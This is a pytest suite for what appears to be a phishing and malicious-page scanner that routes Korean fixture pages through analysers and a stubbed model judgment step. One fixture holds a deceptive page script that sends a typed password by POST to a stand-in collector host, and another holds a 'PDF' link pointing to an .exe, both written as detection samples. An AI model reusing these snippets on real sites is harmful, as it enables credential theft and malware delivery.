"""Approved ordinary flows through real producers, Messages and public Result."""
from copy import deepcopy
import importlib.util
import io
import json
import os
from pathlib import Path
import sys
import types
import asyncio
from datetime import datetime, timezone
from urllib.parse import urlsplit

import pytest

from l0.registry import analyze
from L3_SCANNER import scan_content
from L3_SCANNER.policies.operational import operational_detection_policy
from evidence_pipeline.aws_runtime import persist_layer, context as context_operation, record_key, activity
from evidence_pipeline.aws_fast_result import keys, persist_context, run_judgment, load_deep_input, run_requested_deep_analysis
from evidence_pipeline.fast_context import build_fast_context
from evidence_pipeline.fast_judgment import PROMPT, validate_response, link_judgment
from evidence_pipeline.fast_public import make_public_result, validate_public_result
from evidence_pipeline.fast_mapping import read_location
from evidence_pipeline.gateway import AnthropicGateway
from evidence_pipeline.records import canonical, digest
from test_model_text import capture_l012
from test_l2_readable_context import capture_http


CASES = {
    'login': ('https://community.example.org/login', '''<title>회원 로그인</title><p>아이디와 비밀번호를 입력하세요.</p>
        <form method="post" action="/session"><input name="user"><input type="password" name="password"></form>
        <script src="/assets/usage-metrics.js"></script>''', 'BENIGN'),
    'document-link': ('https://page.example.com/document', '''<title>계약서 PDF 열람</title>
        <a href="https://files.example.net/contract-viewer.exe">계약서 PDF 보기</a>''', 'LIKELY_MALICIOUS'),
    'credential-deception': ('https://account-check.example.org/', '''<title>계정 비밀번호 보안 점검</title>
        <p>사용 중인 계정의 비밀번호를 입력하세요. 비밀번호는 서버로 전송되지 않으며 브라우저 안에서만 점검합니다.</p>
        <form><input id="password" name="password" type="password"></form>
        <script>function check(){const password=document.getElementById('password').value;
        fetch('https://collector.example.net/receive',{method:'POST',body:password});}</script>''', 'MALICIOUS'),
    'insufficient': ('https://unknown.example.org/', None, 'UNKNOWN'),
}


class MemoryStore:
    def __init__(self):
        self.values = {}

    def put(self, key, value, exclusive=False):
        return self.put_bytes(key, canonical(value), exclusive)

    def put_bytes(self, key, data, exclusive=False):
        data = bytes(data)
        if key in self.values and (exclusive or self.values[key] != data):
            raise RuntimeError('immutable_artifact_conflict')
        self.values[key] = data

    def get(self, key, optional=False):
        if optional and key not in self.values:
            return None
        return json.loads(self.values[key])

    def get_bytes(self, key, optional=False):
        return self.values.get(key) if optional else self.values[key]


def recorded_case(name):
    url, html, _ = CASES[name]
    supplied = {'original_url': url, 'document_url': url, 'html': {'content': html}}
    native = scan_content(supplied, operational_detection_policy())
    n0 = analyze(url)
    store, event = MemoryStore(), {'job_id': 'fast-' + name, 'attempt': 1, 'url': url}
    records, raws, refs, envelopes = [], {}, {}, {}
    for layer, n, raw in [('l0', n0, n0['raw_evidence']), ('l3', native, native['raw'])]:
        envelope = persist_layer(event, layer, n, raw, store)
        records.append(envelope['evidence_record']); raws[layer] = raw; envelopes[layer] = envelope
        refs[layer] = {**envelope['artifact_refs'], 'raw_sha256': digest(raw), 'record_sha256': digest(envelope)}
    return event, store, records, raws, refs, native, supplied, envelopes


def response_for(name):
    _, _, verdict = CASES[name]
    selected = {
        'login': [('페이지에 선언된 내용', '제목'), ('입력·폼·기본 제출 경로', '폼 1')],
        'document-link': [('링크·내장 문서 선언', '링크 1')],
        'credential-deception': [('페이지에 선언된 내용', '정적 본문 인용'), ('입력 읽기와 요청 인자 관계', '요청 구문 1')],
        'insufficient': [],
    }[name]
    summary = {
        'login': '회원 로그인 안내와 같은 사이트로 제출하는 폼 구성이 일관됩니다.',
        'document-link': 'PDF 안내와 실행 파일을 시사하는 링크 이름 사이에 차이가 있습니다.',
        'credential-deception': '비밀번호를 전송하지 않는다는 안내와 달리 외부 요청에 넣는 정적 코드 관계가 기록돼 있습니다.',
        'insufficient': '현재 정보로 정상·위험 여부를 판단하기 어렵습니다.',
    }[name]
    notes = {'provisional_assessment': None, 'unknown': None, 'follow_up_questions': []}
    if verdict == 'LIKELY_MALICIOUS':
        notes['provisional_assessment'] = {'direction_basis': 'PDF 안내가 .exe 링크를 가리킴.',
            'consequential_uncertainty': '실제 파일의 형식과 기능으로 문서 위장 여부를 구분한다.'}
    if verdict == 'UNKNOWN':
        notes['unknown'] = {'blocking_gap': '페이지의 목적과 기능을 설명할 자료가 없다.',
            'why_available_facts_do_not_support_other_verdicts': '남은 URL 구성만으로 정상 용도나 구체적인 위해 관계를 뒷받침하기 어렵다.',
            'information_that_would_enable_assessment': '페이지 내용과 연결된 동작 자료.'}
    reason_text = {
        'login': '로그인 안내와 함께 아이디·비밀번호 입력란이 있으며, 같은 사이트의 /session 경로에 POST로 제출하도록 선언돼 있어 회원 로그인 기능으로 해석됩니다.',
        'document-link': '‘계약서 PDF 보기’라는 링크의 대상은 .exe로 끝나는 주소입니다. 문서 열람을 기대한 사용자를 실행 파일로 유도할 우려가 있습니다.',
        'credential-deception': '브라우저 안에서만 비밀번호를 점검한다는 안내와 달리, 비밀번호를 읽어 외부 주소의 POST 본문에 넣는 정적 관계가 있어 기만적인 인증정보 수집 구성으로 판단됩니다.',
        'insufficient': '',
    }[name]
    return {'verdict': verdict, 'summary': summary,
            'reasons': [{'text': reason_text, 'related_items': [{'section_title': s, 'item_label': l} for s, l in selected]}] if selected else [],
            'decision_notes': notes}


def build_persisted(name):
    event, store, records, raws, refs, native, supplied, envelopes = recorded_case(name)
    decision = {'state': 'CONTINUE', 'can_skip_judgment': False}
    store.put(f"records/{event['job_id']}/1/final/url-activity.json", decision)
    output = persist_context(event, store, records, raws, refs, decision)
    return event, store, output, (records, raws, native, supplied, envelopes)


def call(event, store, output, value, *, failure=None):
    calls = []
    def opener(request, **kwargs):
        calls.append(json.loads(request.data))
        if failure:
            raise failure
        envelope = {'stop_reason': 'end_turn', 'content': [{'type': 'text', 'text': json.dumps(value, ensure_ascii=False)}]}
        return io.BytesIO(json.dumps(envelope, ensure_ascii=False).encode())
    gateway = AnthropicGateway('https://offline.example', 'offline-test-key', 'offline-model', opener=opener, max_tokens=8192)
    job = {**event, 'context_key': output['final_key'], 'context_sha256': output['context_sha256']}
    result = run_judgment(job, store, lambda: gateway)
    return result, calls, job


def export(name, event, store, artifacts):
    directory = os.environ.get('FAST_RESULT_EVIDENCE_DIR')
    if not directory:
        return
    target = Path(directory) / name
    target.mkdir(parents=True, exist_ok=True)
    records, raws, native, supplied, envelopes = artifacts
    for filename, value in [('producer-input', supplied), ('native-l3', native), ('records', records),
                            ('raws', raws), ('layer-envelopes', envelopes)]:
        (target / (filename + '.json')).write_text(json.dumps(value, ensure_ascii=False, indent=2), encoding='utf-8')
    for key, data in store.values.items():
        path = target / 's3' / key
        path.parent.mkdir(parents=True, exist_ok=True); path.write_bytes(data)
    ctx = store.get(keys(event['job_id'], 1)['context'])
    (target / 'model-user.txt').write_text(ctx['model_body'], encoding='utf-8')
    (target / 'README.md').write_text('실제 생산자·Builder·저장 adapter를 실행한 통제 입력 재현.\n모델 응답은 합의 사례를 표현한 고정 응답이며 실제 모델 판정 실험이 아님.\n', encoding='utf-8')


@pytest.mark.parametrize('name', CASES)
def test_approved_flow_producer_to_actual_messages_public_and_deep(name):
    event, store, output, artifacts = build_persisted(name)
    before = deepcopy(artifacts)
    context = store.get(keys(event['job_id'], 1)['context'])
    result, calls, job = call(event, store, output, response_for(name))
    assert len(calls) == 1 and calls[0]['system'] == PROMPT
    assert calls[0]['messages'] == [{'role': 'user', 'content': context['model_body']}]
    public = store.get(result['fast_result_key'])
    validate_public_result(public, job_id=event['job_id'], attempt=1)
    assert public['judgment_status'] == 'accepted'
    assert public['judgment']['verdict'] == CASES[name][2]
    diagnostics = store.get(keys(event['job_id'], 1)['diagnostics'])
    assert all(r['status'] == 'resolved' for r in diagnostics['items'])
    assert len(public['details']['facts']) == len(context['details']['facts'])
    assert all(row['sources'] for row in context['item_mapping'] if row['fact_ids'])
    for row in context['item_mapping']:
        if row['fact_ids']:
            locations = [loc for source in row['sources'] for loc in source['storage_locations']]
            assert locations
            for location in locations:
                read_location(store, location)
    for token in ('decision_notes', 'item_mapping', 'source_mapping', 'raw_key', 'coverage', 'evidence_refs'):
        assert token not in public
    text = '\n'.join(f['text'] for f in public['details']['facts'])
    assert '브랜드 식별 정책이 설정되지 않음' not in text
    assert '스크립트 원문을 확보하지 못함' not in text
    assert before == artifacts
    if name == 'credential-deception':
        assert artifacts[2]['raw']['javascript']['network_requests'][0]['source_links']
        assert '분석기가 기록한 입력 연관' in text
        assert any(f['basis']['kind'] == 'static_relation' for f in public['details']['facts'])
    if name == 'insufficient':
        assert public['judgment']['reasons'] == []
        assert context['model_body'] and public['details']['facts']
    reused = run_judgment(job, store, lambda: pytest.fail('cached result must not recall model'))
    assert reused == result
    deep = load_deep_input({**event, 'context_revision': public['context_revision'], 'result_revision': public['result_revision']}, store)
    assert deep['previous_judgment'] == response_for(name)
    assert deep['initial_findings']['builder_context'] == context['model_body']
    assert deep['initial_findings']['builder_record_mapping'] == context['item_mapping']
    with pytest.raises(RuntimeError, match='deep_request_revision_mismatch'):
        load_deep_input({**event, 'context_revision': 'old', 'result_revision': public['result_revision']}, store)
    export(name, event, store, artifacts)


def test_exact_item_lookup_only_omits_unmatched_link():
    event, store, output, _ = build_persisted('document-link')
    value = response_for('document-link')
    value['reasons'][0]['related_items'] += [
        {'section_title': '링크·내장 문서 선언', 'item_label': '존재하지 않는 링크'},
        {'section_title': 'HTML 관측·분석 한계', 'item_label': 'HTML 관측·분석 한계'}]
    result, calls, _ = call(event, store, output, value)
    public = store.get(result['fast_result_key'])
    assert len(calls) == 1 and public['judgment']['verdict'] == 'LIKELY_MALICIOUS'
    assert len(public['judgment']['reasons'][0]['related_fact_ids']) == 1
    assert {'resolved', 'unresolved'} <= {r['status'] for r in store.get(keys(event['job_id'], 1)['diagnostics'])['items']}
    context = store.get(keys(event['job_id'], 1)['context'])
    first = next(r for r in context['item_mapping'] if r['item_label'] == '링크 1')
    context['item_mapping'].append(deepcopy(first))
    linked, diagnostics = link_judgment(response_for('document-link'), context)
    assert linked['verdict'] == 'LIKELY_MALICIOUS' and linked['reasons'][0]['related_fact_ids'] == []
    assert diagnostics[0]['status'] == 'ambiguous'


@pytest.mark.parametrize('fault,state', [('transport', 'failed'), ('shape', 'invalid')])
def test_service_failure_has_no_synthetic_verdict_and_keeps_details(fault, state):
    event, store, output, _ = build_persisted('login')
    value = response_for('login')
    if fault == 'shape':
        del value['summary']
    result, calls, _ = call(event, store, output, value, failure=TimeoutError() if fault == 'transport' else None)
    public = store.get(result['fast_result_key'])
    assert len(calls) == 1 and public['judgment_status'] == state
    assert public['judgment'] is None and public['details']['facts']
    assert not public['deep_analysis']['available']


def test_unused_fields_stay_in_provider_raw_only_without_a_second_model_call():
    event, store, output, _ = build_persisted('login')
    expected = response_for('login')
    value = deepcopy(expected)
    value['confidence'] = 0.5
    value['reasons'][0]['section_title'] = 'unused misplaced extension'
    result, calls, _ = call(event, store, output, value)
    paths = keys(event['job_id'], 1)
    public = store.get(result['fast_result_key'])
    raw = store.get(paths['response'])
    assert len(calls) == 1 and public['judgment_status'] == 'accepted'
    assert json.loads(raw['content'][0]['text']) == value
    assert store.get(paths['judgment'])['response'] == expected
    deep = load_deep_input({**event, 'context_revision': public['context_revision'],
                            'result_revision': public['result_revision']}, store)
    assert deep['previous_judgment'] == expected
    context = store.get(paths['context'])
    assert public['judgment'] == link_judgment(expected, context)[0]


def test_conditional_notes_and_unknown_empty_reasons():
    for name in CASES:
        validate_response(response_for(name))
    value = response_for('document-link'); value['decision_notes']['provisional_assessment'] = None
    with pytest.raises(ValueError):
        validate_response(value)


def test_gateway_configuration_failure_is_service_failure():
    event, store, output, _ = build_persisted('login')
    def unavailable():
        raise ValueError('provider_configuration_missing')
    result = run_judgment({**event, 'context_key': output['final_key'], 'context_sha256': output['context_sha256']}, store, unavailable)
    public = store.get(result['fast_result_key'])
    assert public['judgment_status'] == 'failed' and public['judgment'] is None
    assert public['details']['facts']


def test_deep_bridge_passes_current_context_and_judgment_to_l4_signature():
    event, store, output, _ = build_persisted('login')
    result, _, _ = call(event, store, output, response_for('login'))
    called = []
    async def l4(*, job_id, initial_findings, previous_judgment, store, publisher,
                 registry, model_name, executor_model, execution_limits, files=None, run_config=None):
        called.append((job_id, initial_findings, previous_judgment))
        return {'started': True}
    request = {**event, 'context_revision': result['context_revision'], 'result_revision': result['result_revision']}
    value = asyncio.run(run_requested_deep_analysis(request, store, l4_store=object(),
                         publisher=object(), registry=object(), model_name='offline',
                         executor_model='offline', execution_limits={}, runner=l4))
    assert value == {'started': True} and len(called) == 1
    assert called[0][1]['requested_url'] == event['url']
    assert called[0][2] == response_for('login')
    value = response_for('login'); value['reasons'] = []
    with pytest.raises(ValueError):
        validate_response(value)


def test_joined_l0_l3_aws_context_entrypoint(monkeypatch):
    records, raws, artifacts = capture_l012(monkeypatch)
    url = records[0]['target']['original_url']
    native = scan_content({'original_url': url, 'document_url': url,
                           'html': {'content': CASES['login'][1]}}, operational_detection_policy())
    store, event = MemoryStore(), {'job_id': 'text-l012', 'attempt': 1, 'url': url, 'layers': {}}
    preflight = {'job_id': event['job_id'], 'attempt': 1, 'input_url': url,
                 'hostname': urlsplit(url).hostname, 'addresses': ['192.0.2.10'],
                 'a_addresses': ['192.0.2.10'], 'aaaa_addresses': [],
                 'state': 'public_target_at_preflight', 'layer_network_started': True,
                 'observed_at': datetime.now(timezone.utc).isoformat()}
    for layer in ('l0', 'l1', 'l2', 'l3'):
        n = native if layer == 'l3' else artifacts['native-' + layer]
        raw = native['raw'] if layer == 'l3' else raws[layer]
        e = persist_layer(event, layer, n, raw, store,
                          route={'network_preflight': preflight} if layer in ('l2', 'l3') else None)
        event['layers'][layer] = {'s3_key': e['artifact_refs']['record']}
    event['url_activity'] = activity(event, store)
    monkeypatch.setenv('EVIDENCE_RESULT_CONTRACT', 'fast-result-1')
    output = context_operation(event, store)
    assert output['result_contract_version'] == 'fast-result-1'
    context = store.get(keys(event['job_id'], 1)['context'])
    assert all(s in context['model_body'] for s in ('L0 URL', 'L1 인프라', 'L2 HTTP', 'JavaScript'))
    titles = [s['title'] for s in context['details']['sections']]
    assert all(s in titles for s in ('L0 URL 문자열 관찰', 'DNS A · IP/ASN', '도메인 등록 정보', 'L2 HTTP 관측', '입력·폼·기본 제출 경로'))
    for row in context['item_mapping']:
        if row['fact_ids']:
            locations = [loc for source in row['sources'] for loc in source['storage_locations']]
            assert locations
            for location in locations:
                read_location(store, location)
    envelopes = {layer: store.get(record_key(event['job_id'], 1, layer)) for layer in event['layers']}
    export('joined-l0123', event, store,
           ([e['evidence_record'] for e in envelopes.values()],
            {layer: store.get(e['artifact_refs']['raw']) for layer, e in envelopes.items()},
            native, {'fixture': 'controlled capture_l012 plus declared login HTML'}, envelopes))


@pytest.mark.parametrize('case', ['destination_failure', 'type_missing', 'no_location'])
def test_http_public_keeps_recorded_instruction_without_missing_scope(monkeypatch, case):
    a = capture_http(monkeypatch, case)
    context = build_fast_context([a['record']], {'l2': a['raw']})
    text = '\n'.join(f['text'] for f in context['details']['facts'])
    if case == 'destination_failure':
        assert 'http://b.example.net/end' in text and 'HTTPS→HTTP 이동 지시: 관측됨' in text
        assert '이 응답이 지시한 다음 주소' in text and '응답을 받지 못함' not in text
    else:
        assert '비교에 필요한 두 유형 중 하나가 기록되지 않음' not in text
        assert '서버가 선언한 콘텐츠 유형' in text or '수집한 본문 앞부분에서 추정한 유형' in text


def load_result_lambda(monkeypatch, store, ledger):
    class DDB:
        def get_item(self, **kwargs):
            return {'Item': ledger}
    monkeypatch.setitem(sys.modules, 'boto3', types.SimpleNamespace(client=lambda service: DDB() if service == 'dynamodb' else object()))
    monkeypatch.setenv('JOBS_TABLE', 'offline-jobs')
    spec = importlib.util.spec_from_file_location('fast_result_lambda_test', Path(__file__).parents[1] / 'deployment/result/app.py')
    module = importlib.util.module_from_spec(spec); spec.loader.exec_module(module)
    monkeypatch.setattr(module, '_load', lambda key: store.get(key, optional=True))
    return module


def test_actual_result_handler_returns_only_public_contract(monkeypatch):
    event, store, output, _ = build_persisted('login')
    result, _, _ = call(event, store, output, response_for('login'))
    ledger = {k: {'S': v} for k, v in {'status': 'JUDGED', 'result_contract_version': 'fast-result-1', 'fast_result_key': result['fast_result_key'],
                                     'judgment_key': 'internal-hidden-key', 'url': event['url']}.items()}
    ledger['attempt'] = {'N': '1'}
    module = load_result_lambda(monkeypatch, store, ledger)
    monkeypatch.setattr(module, 'ID_RE', __import__('re').compile(r'^fast-login$'))
    response = module.handler({'pathParameters': {'scanId': event['job_id']}}, None)
    assert response['statusCode'] == 200
    public = json.loads(response['body'])
    assert public == store.get(result['fast_result_key'])
    validate_public_result(public, job_id=event['job_id'], attempt=1)
    assert 'internal-hidden-key' not in response['body']


def test_target_safety_terminal_result_stops_front_polling_without_context(monkeypatch):
    # The existing ASL safety branch ends before ContextTask or a model call.
    job = 'a' * 32
    ledger = {k: {'S': v} for k, v in {
        'status': 'TARGET_BLOCKED', 'result_contract_version': 'fast-result-1',
        'judgment_status': 'not_requested'}.items()}
    ledger['attempt'] = {'N': '1'}
    module = load_result_lambda(monkeypatch, MemoryStore(), ledger)
    response = module.handler({'pathParameters': {'scanId': job}}, None)
    public = json.loads(response['body'])
    assert response['statusCode'] == 200
    assert public['judgment_status'] == 'not_requested'
    assert public['judgment'] is None and public['details']['facts'] == []
    assert not public['deep_analysis']['available']
